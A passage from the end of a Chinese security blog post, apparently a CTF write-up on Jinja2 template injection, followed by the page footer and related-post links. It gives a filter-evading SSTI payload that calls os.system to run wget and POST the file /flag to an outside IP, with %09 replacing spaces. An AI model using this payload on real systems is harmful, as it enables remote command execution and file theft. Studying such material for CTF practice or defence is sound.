+<p>使用<code>wegt</code>进行数据外带，<code>wget</code>访问<code>xx.xxx.xx.243</code>使用<code>--post-file=文件名</code>将某个文件中的数据作为post值传输</p>
+<p>空格被过滤，使用<code>%09</code>绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%if(lipsum|attr(&#x27;%c%cglobals%c%c&#x27;%(95,95,95,95))|attr(&#x27;%c%cgetitem%c%c&#x27;%(95,95,95,95))(&#x27;os&#x27;)|attr(&#x27;system&#x27;)(&#x27;wget%09xx.xxx.xx.243:7777%09--post-file=/flag&#x27;))%&#125;1&#123;%endif%&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+  </div>
+
+  
+    <nav class="post-toc" id="post-toc" aria-label="文章目录"></nav>
+  
+
+  
+    <footer class="post__license">
+      <span class="post__license-author">Yliken</span>
+      <span class="post__license-sep" aria-hidden="true">·</span>
+      <a class="post__license-link" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a>
+    </footer>
+  
+</article>
+
+
+  <section class="related" aria-label="相关阅读">
+    <h2 class="related__title">相关阅读</h2>
+    <ul class="related__list">
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2024-03-06">2024·03·06</time>
+          <a class="related__link" href="/2024/03/06/%E5%9F%BA%E7%A1%80/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">正则表达式</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2024-03-04">2024·03·04</time>
+          <a class="related__link" href="/2024/03/04/%E5%9F%BA%E7%A1%80/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">zkaq-代码执行</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2024-01-23">2024·01·23</time>
+          <a class="related__link" href="/2024/01/23/%E5%9F%BA%E7%A1%80/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%B0%E5%88%A9%E7%94%A8/">SSRF、</a>
+        </li>
+      
+    </ul>
+  </section>
+
+
+
+  <nav class="post-nav" aria-label="相邻文章">
+    
+      <a class="post-nav__link post-nav__link--prev" href="/2024/03/06/%E5%9F%BA%E7%A1%80/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">
+        <span class="post-nav__dir">← 上一篇</span>
+        <span class="post-nav__title">正则表达式</span>
+      </a>
+    
+    
+      <a class="post-nav__link post-nav__link--next" href="/2024/03/05/%E5%9F%BA%E7%A1%80/unserialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+        <span class="post-nav__dir">下一篇 →</span>
+        <span class="post-nav__title">php反序列化</span>
+      </a>
+    
+  </nav>
+
+
+    </div>
+  </main>
+
+  
+
+  
+  <footer class="site-footer">
+    <div class="container site-footer__inner">
+      
+      <p class="site-footer__copy">
+        © 2026 Yliken
+      </p>
+      
+        <p class="site-footer__motto">在技术里较真，也在生活里留白。</p>
+      
+      
+        <p class="site-footer__powered">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> · <span class="site-footer__theme">Page One</span></p>
+      
+    </div>
+    
+  </footer>
+  
+<script src="/js/theme.js"></script>
+
+  
+  
+</body>
+</html>
